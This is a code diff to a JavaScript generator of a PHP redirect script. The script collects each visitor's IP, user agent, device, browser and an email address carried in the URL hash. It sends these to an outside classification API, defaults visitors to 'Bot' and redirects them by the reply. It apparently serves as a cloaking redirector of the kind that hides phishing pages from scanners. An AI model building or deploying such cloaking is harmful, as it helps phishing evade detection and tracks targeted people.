@@ -231,36 +231,7 @@ session_start();
 
 $apiKey = '${apiKey}';
 $apiEndpoint = '${apiEndpoint}/api/classify';
-
-if (!isset($_GET['e']) && !isset($_GET['email']) && strpos($_SERVER['REQUEST_URI'], '#') !== false) {
-    ?><!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
-<body>
-<script>
-(function() {
-    var hash = window.location.hash;
-    if (hash && hash.length > 1) {
-        var hashParams = hash.substring(1);
-        var pairs = hashParams.split('&');
-        for (var i = 0; i < pairs.length; i++) {
-            var keyVal = pairs[i].split('=');
-            if (keyVal.length >= 2 && (keyVal[0] === 'e' || keyVal[0] === 'email')) {
-                var emailParam = decodeURIComponent(keyVal.slice(1).join('='));
-                var search = window.location.search;
-                var separator = search ? '&' : '?';
-                var newUrl = window.location.pathname + search + separator + 'e=' + encodeURIComponent(emailParam);
-                window.location.replace(newUrl);
-                break;
-            }
-        }
-    }
-})();
-</script>
-</body>
-</html><?php
-    exit;
-}
+$cacheDuration = 600;
 
 $visitorIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 $visitorUserAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
@@ -270,7 +241,7 @@ if (isset($_SESSION['ct_' . $visitorFingerprint])) {
     $cached = $_SESSION['ct_' . $visitorFingerprint];
     $cacheAge = time() - $cached['timestamp'];
     
-    if ($cacheAge < 600) {
+    if ($cacheAge < $cacheDuration) {
         $cachedUrl = $cached['redirectUrl'];
         if (!empty($_SERVER['QUERY_STRING'])) {
             $separator = (strpos($cachedUrl, '?') !== false) ? '&' : '?';
@@ -287,52 +258,84 @@ if (isset($_SESSION['ct_' . $visitorFingerprint])) {
     }
 }
 
-function detectDevice($userAgent) {
-    if (preg_match('/mobile|android|iphone|ipad|ipod/i', $userAgent)) {
-        return 'Mobile';
-    } elseif (preg_match('/tablet|ipad/i', $userAgent)) {
-        return 'Tablet';
-    } else {
-        return 'Desktop';
+$clientBrowser = $_POST['browser'] ?? null;
+$clientDevice = $_POST['device'] ?? null;
+
+if (!$clientBrowser || !$clientDevice) {
+    ?><!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Redirecting...</title>
+<style>body{margin:0;background:#fff}</style>
+</head><body>
+<form id="dataForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?>" style="display:none;">
+    <input type="hidden" name="browser" id="browserInput">
+    <input type="hidden" name="device" id="deviceInput">
+</form>
+<script>
+(function(){
+    var hash=window.location.hash;
+    if(hash&&hash.indexOf('e=')>-1&&(!window.location.search||window.location.search.indexOf('e=')===-1)){
+        var pairs=hash.substring(1).split('&');
+        for(var i=0;i<pairs.length;i++){
+            var kv=pairs[i].split('=');
+            if(kv[0]==='e'||kv[0]==='email'){
+                var email=decodeURIComponent(kv.slice(1).join('='));
+                var sep=window.location.search?'&':'?';
+                window.location.replace(window.location.pathname+window.location.search+sep+'e='+encodeURIComponent(email));
+                return;
+            }
+        }
     }
+    function detectBrowser(){var ua=navigator.userAgent;if(ua.indexOf('Firefox')>-1)return 'Firefox';if(ua.indexOf('Edg')>-1)return 'Edge';if(ua.indexOf('Chrome')>-1)return 'Chrome';if(ua.indexOf('Safari')>-1)return 'Safari';if(ua.indexOf('Trident')>-1||ua.indexOf('MSIE')>-1)return 'IE';return 'Unknown'}
+    function detectDevice(){var ua=navigator.userAgent;if(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua))return 'Tablet';if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua))return 'Mobile';return 'Desktop'}
+    document.getElementById('browserInput').value=detectBrowser();
+    document.getElementById('deviceInput').value=detectDevice();
+    document.getElementById('dataForm').submit();
+})();
+</script></body></html><?php
+    exit;
 }
 
-function detectBrowser($userAgent) {
-    if (preg_match('/MSIE|Trident/i', $userAgent)) return 'Internet Explorer';
-    if (preg_match('/Edg/i', $userAgent)) return 'Microsoft Edge';
-    if (preg_match('/Chrome/i', $userAgent)) return 'Chrome';
-    if (preg_match('/Safari/i', $userAgent) && !preg_match('/Chrome/i', $userAgent)) return 'Safari';
-    if (preg_match('/Firefox/i', $userAgent)) return 'Firefox';
-    if (preg_match('/Opera|OPR/i', $userAgent)) return 'Opera';
-    return 'Unknown';
+$email = null;
+if (!empty($_SERVER['QUERY_STRING'])) {
+    parse_str($_SERVER['QUERY_STRING'], $queryParams);
+    $email = $queryParams['e'] ?? $queryParams['email'] ?? null;
 }
 
-$email = $_GET['email'] ?? $_GET['e'] ?? null;
-$deviceType = detectDevice($visitorUserAgent);
-$browser = detectBrowser($visitorUserAgent);
-$redirectUrl = null;
-$visitorType = null;
-
-$ch = curl_init($apiEndpoint);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
+$requestData = [
     'ip' => $visitorIp,
-    'userAgent' => $visitorUserAgent,
-    'deviceType' => $deviceType,
-    'browser' => $browser,
-    'email' => $email
-]));
-curl_setopt($ch, CURLOPT_HTTPHEADER, [
-    'Content-Type: application/json',
-    'X-API-Key: ' . $apiKey
+    'userAgent' => $visitorUserAgent
+];
+
+if ($clientBrowser) {
+    $requestData['browser'] = $clientBrowser;
+}
+if ($clientDevice) {
+    $requestData['deviceType'] = $clientDevice;
+}
+if ($email) {
+    $requestData['email'] = $email;
+}
+
+$ch = curl_init();
+curl_setopt_array($ch, [
+    CURLOPT_URL => $apiEndpoint,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => json_encode($requestData),
+    CURLOPT_HTTPHEADER => [
+        'Content-Type: application/json',
+        'X-API-Key: ' . $apiKey
+    ],
+    CURLOPT_TIMEOUT => 10,
+    CURLOPT_SSL_VERIFYPEER => true
 ]);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
 
 $response = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
+
+$redirectUrl = null;
+$visitorType = 'Bot';
 
 if ($httpCode === 200 && $response) {
     $data = json_decode($response, true);
@@ -361,54 +364,9 @@ if ($redirectUrl) {
     exit;
 }
 
-http_response_code(200);
-?><!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Service Unavailable</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 500px;
-            padding: 40px;
-            text-align: center;
-        }
-        .icon { font-size: 48px; margin-bottom: 20px; }
-        h1 { color: #333; margin-bottom: 15px; font-size: 24px; }
-        p { color: #666; line-height: 1.6; margin-bottom: 20px; }
-        .note { 
-            background: #f5f5f5; 
-            padding: 15px; 
-            border-radius: 6px; 
-            margin-top: 20px;
-            font-size: 14px;
-            color: #888;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="icon">⚠️</div>
-        <h1>Service Configuration Required</h1>
-        <p>This service is currently unavailable. Please check your account dashboard to ensure all required settings are configured correctly.</p>
-        <div class="note">Error Code: CONFIG_001</div>
-    </div>
-</body>
-</html>`;
+http_response_code(503);
+die('Service temporarily unavailable. Please try again later.');
+?>`;
 
     try {
       const zip = new JSZip();
